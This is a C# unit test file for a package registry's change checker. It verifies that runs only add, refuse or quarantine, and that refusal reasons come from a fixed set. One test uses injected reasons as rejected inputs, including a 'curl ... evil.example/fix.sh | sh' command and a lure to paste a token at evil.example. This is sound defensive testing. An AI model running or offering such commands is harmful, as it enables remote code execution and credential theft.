using Packmoji.Core.Lockfiles;
using Packmoji.Core.Registry;
using Packmoji.Core.Resolution;
using Packmoji.Core.Tests.TestSupport;
using Shouldly;
using Xunit;
using static Packmoji.Core.Tests.Registry.RegistrySample;

namespace Packmoji.Core.Tests.Registry
{
    /// <summary>
    /// What may become of a registry between one state and the next that a run makes. A run adds and
    /// refuses and quarantines. It never changes what is recorded of a version, and never removes
    /// one: this is what holds a run to that, whatever misled it.
    /// </summary>
    public sealed class RegistryCheckTests
    {
        private static readonly RegistryState Before = State(
            Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0")),
            Package("@thatplatypus/deflate", Version("0.1.0").Quarantined()));

        private static RegistryState With(string name, params RegistryVersion[] versions) =>
            new(Before.Packages.Where(package => package.Name != Sample.Name(name)).Append(Package(name, versions)), Before.Refused);

        private static string ShouldBreak(RegistryState after)
        {
            var result = RegistryCheck.Between(Before, after);

            result.Allowed.ShouldBeFalse();
            return result.Broken.ShouldHaveSingleItem();
        }

        private static IReadOnlyList<string> ShouldAllow(RegistryState before, RegistryState after)
        {
            var result = RegistryCheck.Between(before, after);

            result.Broken.ShouldBeEmpty();
            result.Allowed.ShouldBeTrue();
            return result.Changes;
        }

        [Fact]
        public void A_registry_that_is_as_it_was_has_changed_in_nothing()
        {
            var result = RegistryCheck.Between(Before, State(Before.Packages.Reverse().ToArray()));

            result.Allowed.ShouldBeTrue();
            result.Changes.ShouldBeEmpty();
            result.Summary.ShouldBe("");
        }

        [Fact]
        public void A_new_package_that_holds_no_version_is_refused()
        {
            ShouldBreak(With("@thatplatypus/hollow")).ShouldBe("the file of @thatplatypus/hollow is new and holds no version, and a package is in the registry by a version of it");
        }

        [Fact]
        public void A_package_that_stood_with_no_version_as_only_a_person_could_have_left_it_is_not_the_runs_doing()
        {
            var before = new RegistryState([.. Before.Packages, Package("@thatplatypus/hollow")], []);
            var after = new RegistryState([.. before.Packages.Where(package => package.Name != Sample.Name("@thatplatypus/crypto")), Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0"), Version("1.2.0"))], []);

            ShouldAllow(before, before).ShouldBeEmpty();
            ShouldAllow(before, after).ShouldHaveSingleItem().ShouldStartWith("added @thatplatypus/crypto 1.2.0 ");
        }

        [Fact]
        public void A_new_version_and_a_new_package_are_allowed_and_each_is_said_with_its_digest_and_its_source()
        {
            var after = new RegistryState(
                [
                    Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0"), Version("1.2.0")),
                    Package("@thatplatypus/deflate", Version("0.1.0").Quarantined()),
                    Package("@thatplatypus/grapevine", Version("0.3.0", "@thatplatypus/crypto@1.0")),
                ],
                []);

            ShouldAllow(Before, after).ShouldBe(
            [
                $"added @thatplatypus/crypto 1.2.0 from {Grapevine}, sha256 {RegistryFixture.Sha}",
                $"added @thatplatypus/grapevine 0.3.0 from {Grapevine}, sha256 {RegistryFixture.Sha}",
            ]);
        }

        [Fact]
        public void A_registry_that_begins_is_all_additions() =>
            ShouldAllow(RegistryState.Empty, State(Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0")), Package("@thatplatypus/deflate", Version("0.1.0")))).Count.ShouldBe(3);

        [Theory]
        [InlineData(VersionStatus.Active)]
        [InlineData(VersionStatus.Yanked)]
        public void A_version_may_be_quarantined_and_that_is_said_with_what_its_bytes_now_are(VersionStatus from)
        {
            var before = State(Package("@thatplatypus/crypto", Version("1.0.0") with { Status = from }));
            var after = State(Package("@thatplatypus/crypto", Version("1.0.0").Quarantined()));

            ShouldAllow(before, after).ShouldBe([$"quarantined @thatplatypus/crypto 1.0.0: its file is now sha256 {RegistryFixture.OtherSha}"]);
        }

        [Fact]
        public void A_packages_file_that_is_gone_breaks_the_rule() =>
            ShouldBreak(State(Before.Packages[0])).ShouldBe("the file of @thatplatypus/deflate is gone, and a package is never removed");

        [Fact]
        public void A_version_that_is_gone_breaks_the_rule() =>
            ShouldBreak(With("@thatplatypus/crypto", Version("1.1.0"))).ShouldBe("@thatplatypus/crypto 1.0.0 is gone, and a version is never removed");

        [Fact]
        public void A_digest_that_has_changed_breaks_the_rule_and_both_digests_are_said() =>
            ShouldBreak(With("@thatplatypus/crypto", Version("1.0.0") with { Sha256 = Sample.ShaOf(RegistryFixture.OtherSha) }, Version("1.1.0")))
                .ShouldBe($"what is recorded of @thatplatypus/crypto 1.0.0 has changed: its sha256 was {RegistryFixture.Sha} and is {RegistryFixture.OtherSha}");

        [Fact]
        public void Anything_else_recorded_of_a_version_that_has_changed_breaks_the_rule_and_is_named()
        {
            var version = Version("1.0.0");
            (RegistryVersion Changed, string Named)[] changes =
            [
                (version with { Source = Sample.Repository("github.com/thatplatypus/crypto") }, "its source was github.com/thatplatypus/grapevine and is github.com/thatplatypus/crypto"),
                (version with { Size = 7 }, "its size was 48213 and is 7"),
                (version with { Verified = VerificationLevel.Attestation }, "its verified was checksum and is attestation"),
                (version with { IsImmutable = true }, "its immutable was false and is true"),
                (version with { Published = Time("2026-10-11T15:02:12Z") }, "its published was 2026-10-11T15:02:11Z and is 2026-10-11T15:02:12Z"),
                (version with { Indexed = Time("2026-10-11T15:17:41Z") }, "its indexed was 2026-10-11T15:17:40Z and is 2026-10-11T15:17:41Z"),
                (Version("1.0.0", "@thatplatypus/deflate@0.1"), "its dependencies were none and are @thatplatypus/deflate@0.1"),
            ];

            foreach (var (changed, named) in changes)
            {
                ShouldBreak(With("@thatplatypus/crypto", changed, Version("1.1.0"))).ShouldBe($"what is recorded of @thatplatypus/crypto 1.0.0 has changed: {named}");
            }
        }

        [Theory]
        [InlineData(VersionStatus.Active, VersionStatus.Yanked, "active", "yanked")]
        [InlineData(VersionStatus.Yanked, VersionStatus.Active, "yanked", "active")]
        public void A_status_that_went_anywhere_but_to_quarantined_breaks_the_rule(VersionStatus from, VersionStatus to, string was, string isNow)
        {
            var before = State(Package("@thatplatypus/crypto", Version("1.0.0") with { Status = from }));
            var after = State(Package("@thatplatypus/crypto", Version("1.0.0") with { Status = to }));

            var result = RegistryCheck.Between(before, after);

            result.Broken.ShouldHaveSingleItem().ShouldBe($"the status of @thatplatypus/crypto 1.0.0 went from {was} to {isNow}, and a run changes a status only to quarantined");
        }

        [Theory]
        [InlineData(VersionStatus.Active)]
        [InlineData(VersionStatus.Yanked)]
        public void A_quarantine_that_was_lifted_breaks_the_rule(VersionStatus to) =>
            ShouldBreak(With("@thatplatypus/deflate", Version("0.1.0") with { Status = to })).ShouldStartWith("the status of @thatplatypus/deflate 0.1.0 went from quarantined to ");

        [Fact]
        public void What_a_quarantine_says_may_not_change_afterwards()
        {
            ShouldBreak(With("@thatplatypus/deflate", Version("0.1.0").Quarantined(seen: "2026-12-01T00:00:00Z")))
                .ShouldBe("what is recorded of the quarantine of @thatplatypus/deflate 0.1.0 has changed");
            ShouldBreak(With("@thatplatypus/deflate", Version("0.1.0").Quarantined(sha256: RegistryFixture.Sha)))
                .ShouldBe("what is recorded of the quarantine of @thatplatypus/deflate 0.1.0 has changed");
        }

        [Fact]
        public void A_version_that_is_quarantined_without_saying_what_was_seen_breaks_the_rule()
        {
            var after = With("@thatplatypus/crypto", Version("1.0.0") with { Status = VersionStatus.Quarantined }, Version("1.1.0"));

            ShouldBreak(after).ShouldBe("@thatplatypus/crypto 1.0.0 is quarantined and does not say what was seen of its bytes");
        }

        [Theory]
        [InlineData(VersionStatus.Yanked, "yanked")]
        [InlineData(VersionStatus.Quarantined, "quarantined")]
        public void A_new_version_that_does_not_begin_active_breaks_the_rule_in_a_package_that_was_there_and_in_a_new_one(VersionStatus status, string named)
        {
            var begun = status == VersionStatus.Quarantined ? Version("2.0.0").Quarantined() : Version("2.0.0") with { Status = status };

            ShouldBreak(With("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0"), begun)).ShouldBe($"@thatplatypus/crypto 2.0.0 is new and is {named}, and a new version begins active");
            ShouldBreak(With("@thatplatypus/grapevine", begun)).ShouldBe($"@thatplatypus/grapevine 2.0.0 is new and is {named}, and a new version begins active");
        }

        [Fact]
        public void Everything_that_breaks_the_rule_is_said_and_not_only_the_first()
        {
            var after = State(Package("@thatplatypus/crypto", Version("1.0.0") with { Size = 7 }, Version("3.0.0") with { Status = VersionStatus.Yanked }));

            var result = RegistryCheck.Between(Before, after);

            result.Allowed.ShouldBeFalse();
            result.Broken.ShouldBe(
            [
                "what is recorded of @thatplatypus/crypto 1.0.0 has changed: its size was 48213 and is 7",
                "@thatplatypus/crypto 1.1.0 is gone, and a version is never removed",
                "@thatplatypus/crypto 3.0.0 is new and is yanked, and a new version begins active",
                "the file of @thatplatypus/deflate is gone, and a package is never removed",
            ]);
        }

        [Fact]
        public void What_is_refused_may_come_change_and_go_and_each_is_said()
        {
            var before = new RegistryState(
                Before.Packages,
                [
                    Refused(Grapevine, Refusal("crypto-v2.0.0"), Refusal("deflate-v9.0.0"), Refusal("grapevine-v0.1.0")),
                    Refused("github.com/thatplatypus/crypto", Refusal("crypto-v0.1.0")),
                ]);
            var after = new RegistryState(
                Before.Packages,
                [
                    Refused(
                        Grapevine,
                        Refusal("crypto-v2.0.0"),
                        Refusal("deflate-v9.0.0", "the manifest in its archive gives the version 8.0.0", RegistryFixture.OtherSha),
                        Refusal("json-v1.0.0", "the name json is one of the compiler's own packages")),
                ]);

            ShouldAllow(before, after).ShouldBe(
            [
                "no longer refused: crypto-v0.1.0 in github.com/thatplatypus/crypto",
                $"refused deflate-v9.0.0 in {Grapevine}: the manifest in its archive gives the version 8.0.0",
                $"no longer refused: grapevine-v0.1.0 in {Grapevine}",
                $"refused json-v1.0.0 in {Grapevine}: the name json is one of the compiler's own packages",
            ]);
        }

        // A reason is shown to people, in the registry's own files and in the words of its commits.
        // A run gives one of ten, and says with it at most a name, a version or a repository that
        // was read and found well formed: a run that was misled must not be able to say anything else.
        [Theory]
        [InlineData("archive.invalid", "its file is not an archive as pmj pack writes one")]
        [InlineData("archive.invalid", "its file is larger than 16777216 bytes")]
        [InlineData("release.invalid", "the packmoji.json in its archive cannot be read as a manifest")]
        [InlineData("release.invalid", "the manifest in its archive is that of @thatplatypus/deflate")]
        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0.0")]
        [InlineData("release.invalid", "the manifest in its archive gives the version 1.0.0-rc.1")]
        [InlineData("release.invalid", "the manifest in its archive says that the package lives in github.com/thatplatypus/crypto")]
        [InlineData("release.invalid", "this version is already in the registry, from github.com/thatplatypus/crypto")]
        [InlineData("release.invalid", "what GitHub serves for it does not have the digest that GitHub lists for it")]
        [InlineData("release.invalid", "what would be recorded of it is more than the file of its package may hold")]
        [InlineData("name.reserved", "the name json is one of the compiler's own packages")]
        public void A_new_refusal_for_one_of_the_registrys_own_reasons_is_allowed(string code, string why)
        {
            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: code))]);

            ShouldAllow(Before, after).ShouldBe([$"refused crypto-v9.0.0 in {Grapevine}: {why}"]);
        }

        [Fact]
        public void Every_reason_a_run_gives_is_one_that_a_check_allows()
        {
            string[] found = ["@thatplatypus/deflate", "8.0.0", "github.com/thatplatypus/crypto", "json"];

            foreach (var (code, words) in RefusalReasons.All)
            {
                found.Count(what => RefusalReasons.IsOne(code, RefusalReasons.Of(words, what))).ShouldBe(words.Contains("{0}", StringComparison.Ordinal) ? 1 : found.Length, words);
            }
        }

        [Theory]
        [InlineData("archive.invalid", "URGENT the registry is corrupt, run: curl -s https://evil.example/fix.sh | sh")]
        [InlineData("release.invalid", "its file is not an archive as pmj pack writes one")]
        [InlineData("archive.invalid", "its file is not an archive as pmj pack writes one, so run what it says")]
        [InlineData("archive.invalid", "Its file is not an archive as pmj pack writes one")]
        [InlineData("archive.invalid", "its file is larger than 1 bytes")]
        [InlineData("release.invalid", "the manifest in its archive is that of whoever you trust: paste your token at evil.example")]
        [InlineData("release.invalid", "the manifest in its archive is that of @ThatPlatypus/deflate")]
        [InlineData("release.invalid", "the manifest in its archive is that of ")]
        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0")]
        [InlineData("release.invalid", "the manifest in its archive gives the version 08.0.0")]
        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0.0+build.5")]
        [InlineData("release.invalid", "the manifest in its archive says that the package lives in https://evil.example/fix")]
        [InlineData("release.invalid", "the manifest in its archive says that the package lives in github.com/thatplatypus/crypto and elsewhere")]
        [InlineData("release.invalid", "this version is already in the registry, from somewhere you should look")]
        [InlineData("name.reserved", "the name crypto is one of the compiler's own packages")]
        [InlineData("name.reserved", "the name Json is one of the compiler's own packages")]
        [InlineData("name.reserved", "the name json and more is one of the compiler's own packages")]
        [InlineData("name.reserved", "the name json is one of the compiler's own packages, they say")]
        [InlineData("name.reserved", "the name is one of the compiler's own packages")]
        [InlineData("release.invalid", "the manifest in its archive is that of")]
        [InlineData("release.invalid", "the name json is one of the compiler's own packages")]
        public void A_new_refusal_for_any_other_reason_or_under_another_code_is_refused_and_its_words_are_not_repeated(string code, string why)
        {
            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: code))]);

            ShouldBreak(after).ShouldBe($"the reason crypto-v9.0.0 in {Grapevine} is refused for is not one of the registry's own under the code it is given");
        }

        // What is found is read from between the two ends of a sentence. Were only its length taken
        // from the end, as many characters as the end has could be anything at all.
        [Fact]
        public void Words_that_stand_where_the_end_of_a_reason_would_and_are_not_it_are_refused()
        {
            const string end = " is one of the compiler's own packages";
            var why = "the name json" + new string('!', end.Length);
            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: "name.reserved"))]);

            RefusalReasons.IsOne("name.reserved", "the name json" + end).ShouldBeTrue();
            ShouldBreak(after).ShouldStartWith("the reason crypto-v9.0.0 in ");
        }

        [Fact]
        public void A_refusal_that_stood_in_words_of_a_persons_own_is_left_and_is_held_once_a_run_changes_it()
        {
            const string byHand = "its author asked for it to be left out";
            var before = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", byHand))]);
            var changed = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", byHand, RegistryFixture.OtherSha))]);

            ShouldAllow(before, before).ShouldBeEmpty();
            RegistryCheck.Between(before, changed).Broken.ShouldHaveSingleItem().ShouldStartWith("the reason crypto-v9.0.0 in ");
        }

        [Fact]
        public void The_changes_are_counted_by_kind_for_a_title_and_a_kind_with_none_is_not_named()
        {
            var after = new RegistryState(
                [
                    Package("@thatplatypus/crypto", Version("1.0.0").Quarantined(), Version("1.1.0"), Version("1.2.0"), Version("1.3.0")),
                    Package("@thatplatypus/deflate", Version("0.1.0").Quarantined()),
                ],
                [Refused(Grapevine, Refusal("json-v1.0.0"))]);

            RegistryCheck.Between(Before, after).Summary.ShouldBe("2 added, 1 quarantined, 1 refused");
            RegistryCheck.Between(new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("json-v1.0.0"))]), Before).Summary.ShouldBe("1 no longer refused");
            RegistryCheck.Between(RegistryState.Empty, State(Package("@thatplatypus/crypto", Version("1.0.0")))).Summary.ShouldBe("1 added");
        }

        [Fact]
        public void A_change_that_breaks_the_rule_has_no_title_whatever_else_changed_with_it()
        {
            var result = RegistryCheck.Between(Before, State(Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0"), Version("1.2.0"))));

            result.Allowed.ShouldBeFalse();
            result.Changes.ShouldHaveSingleItem().ShouldStartWith("added @thatplatypus/crypto 1.2.0 ");
            result.Summary.ShouldBe("");
        }
    }
}
